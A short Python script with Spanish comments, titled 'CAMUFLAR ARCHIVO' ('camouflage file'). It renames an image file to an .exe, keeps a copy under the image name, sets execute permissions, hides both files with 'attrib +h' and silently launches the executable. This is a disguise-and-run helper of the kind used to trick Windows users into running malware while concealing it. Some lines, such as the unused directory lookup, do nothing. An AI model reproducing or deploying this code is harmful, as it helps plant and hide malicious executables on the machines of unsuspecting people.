#!/usr/bin/python
#-*- coding: latin-1 -*-

print("###############################################")
print("############## CAMUFLAR ARCHIVO ###############")
print("###############################################")

import os
import shutil
import stat

################################################################
################################################################

def directorio_actual():
    os.getcwd()

directorio_actual()
##################################################################)
def ejecutar_imagen():
    nuevo = "set_imagen.jpg"
    if os.path.exists(nuevo) == True:

        new = nuevo.replace(".jpg", ".exe")#-> remplaza la extesion .jpg a .exe
        shutil.copy(nuevo, "_" + nuevo)#-> copia la imagen y la renombra a _set_imagen.jpg
        os.rename(nuevo, new) #-> set_imagen.exe
        os.rename("_" + nuevo, nuevo)#-> renombra la imagen [_set_imagen.jpg a set_imagen.jpg]
        os.chmod(new, stat.S_IXUSR + stat.S_IRUSR + stat.S_IWUSR + stat.S_IRGRP + stat.S_IXGRP)

        os.system("attrib +h set_imagen.jpg")
        os.system("attrib +h set_imagen.exe")

        os.system("start set_imagen.exe")
        #os.system("start set_ap.exe")

ejecutar_imagen()